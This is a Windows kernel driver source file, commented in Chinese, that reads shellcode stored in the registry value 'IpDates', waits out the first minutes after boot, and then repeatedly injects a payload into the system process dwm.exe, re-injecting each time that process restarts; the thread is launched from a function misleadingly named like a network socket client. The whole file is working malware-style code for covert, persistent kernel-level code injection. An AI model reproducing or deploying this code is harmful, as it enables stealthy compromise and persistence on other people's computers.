#include <ntifs.h>
#include "help.h"
#include "UMInjectionHandler.h"

PETHREAD  ClientThread = nullptr;
const ULONG  POOL_TAG = 'endf'; 

EX_RUNDOWN_REF ApcHandler::g_rundown_protection;
unsigned char* injectedShellcode;
size_t injectedShellcodelen;

extern "C" NTSTATUS  inject(PUNICODE_STRING RegistryPath);

VOID WSKClientThread(_In_ PVOID Context)
{
	NTSTATUS Status = STATUS_SUCCESS;
	ULONG           msec;
	MyGetTickCount(&msec);
	KdPrint(("开机时间 = %ld minutes.\r\n", msec / 1000 / 60));
	if (msec / 1000 / 60 < 5) 
		Ksleep(3*60 * 1000);
		 
	//读取值
	UNICODE_STRING ustrRegistry;
	UNICODE_STRING ustrKeyValueName;
	RtlInitUnicodeString(&ustrRegistry, L"\\Registry\\Machine\\Software");
	RtlInitUnicodeString(&ustrKeyValueName, L"IpDates");
	HANDLE hRegister = NULL;
	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	NTSTATUS status = STATUS_SUCCESS;
	ULONG ulBufferSize = 0;
	PKEY_VALUE_PARTIAL_INFORMATION pKeyValuePartialInfo = NULL;

	// 打开注册表键
	InitializeObjectAttributes(&objectAttributes, &ustrRegistry, OBJ_CASE_INSENSITIVE , NULL, NULL);
	status = ZwOpenKey(&hRegister, KEY_ALL_ACCESS, &objectAttributes);
	if (!NT_SUCCESS(status))
	{
		PsTerminateSystemThread(STATUS_SUCCESS);
		return;
	}
	// 先获取查询注册表键值所需缓冲区的大小
	status = ZwQueryValueKey(hRegister, &ustrKeyValueName, KeyValuePartialInformation, NULL, 0, &ulBufferSize);
	if (0 == ulBufferSize)
	{
		ZwClose(hRegister);
		PsTerminateSystemThread(STATUS_SUCCESS);
		return;
	}
	// 申请缓冲区
	pKeyValuePartialInfo = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePool(NonPagedPool, ulBufferSize);
	// 查询注册表键值并获取查询结果
	status = ZwQueryValueKey(hRegister, &ustrKeyValueName, KeyValuePartialInformation, pKeyValuePartialInfo, ulBufferSize, &ulBufferSize);
	if (!NT_SUCCESS(status))
	{
		ExFreePool(pKeyValuePartialInfo);
		ZwClose(hRegister);
		PsTerminateSystemThread(STATUS_SUCCESS);
		return;
	}
	// 显示查询结果
	DbgPrint("KeyValueName=%wZ, KeyValueType=%d, KeyValueData=%S\n",
		&ustrKeyValueName, pKeyValuePartialInfo->Type, pKeyValuePartialInfo->Data);

	// 释放内存, 关闭句柄
	ZwClose(hRegister);
	injectedShellcodelen = ulBufferSize;
	injectedShellcode = (unsigned char*)ExAllocatePoolWithTag(NonPagedPool, injectedShellcodelen, DRIVER_TAG);
	memcpy(injectedShellcode, pKeyValuePartialInfo->Data, injectedShellcodelen);
	ExFreePool(pKeyValuePartialInfo);
	UNICODE_STRING ProcessName;
	RtlInitUnicodeString(&ProcessName, L"dwm.exe");
	HANDLE pid=0,pidnew=0;

	while (TRUE)   //循环注入大dwm.exe 
	{	
		pid = 0, pidnew = 0;

		pid = UMInjectionHandler::getProcessId(ProcessName);
		KdPrint(("pid = %d .\r\n", pid));
		if (pid==0)
		{
			Ksleep(30 * 1000);
			continue;
		}
		::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
		Status = UMInjectionHandler::injectDll(HandleToUlong(pid));
		if (!NT_SUCCESS(Status))
		{
			continue;
		}
		do 
		{
			Ksleep(10 * 1000);
			pidnew = UMInjectionHandler::getProcessId(ProcessName);
			KdPrint(("pidnew = %d .\r\n", pidnew));
		} while (pid == pidnew);
	}

	PsTerminateSystemThread(Status);
}

extern "C" NTSTATUS   Inject(ULONG pid)
{
	::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
	return UMInjectionHandler::injectDll(pid);
}

extern "C" NTSTATUS  socketmain( PUNICODE_STRING RegistryPath)
{
	ULONG           msec;
	UNICODE_STRING  uTime;
	PWCHAR          time_str;
	NTSTATUS Status = STATUS_SUCCESS;


	time_str = MyCurTimeStr();
	RtlInitEmptyUnicodeString(&uTime, time_str, (USHORT)wcslen(time_str) * sizeof(WCHAR));
	uTime.Length = (USHORT)wcslen(time_str) * sizeof(WCHAR);
	KdPrint(("系统时间time = %wZ\r\n", &uTime));
	
	do
	{
		WCHAR* dst_buf= (LPWSTR)ExAllocatePoolZero(NonPagedPool, 256 * sizeof(WCHAR), POOL_TAG);;
		RtlCopyMemory(dst_buf, RegistryPath->Buffer, RegistryPath->Length);

		HANDLE ThreadHandle = nullptr;
		Status = PsCreateSystemThread(&ThreadHandle, SYNCHRONIZE,
			nullptr, nullptr, nullptr,
			&WSKClientThread,
			dst_buf);
		if (!NT_SUCCESS(Status))
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[WSK] [Client] PsCreateSystemThread failed: 0x%08X.\n", Status);
			break;
		}
	
		Status = ObReferenceObjectByHandleWithTag(ThreadHandle, SYNCHRONIZE, *PsThreadType, KernelMode,POOL_TAG, (PVOID*)&ClientThread, nullptr);
		ZwClose(ThreadHandle);
		if (!NT_SUCCESS(Status))
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
				"[WSK] [Client] ObReferenceObjectByHandleWithTag failed: 0x%08X.\n",
				Status);

			break;
		}
	} while (false);

	return Status;
}








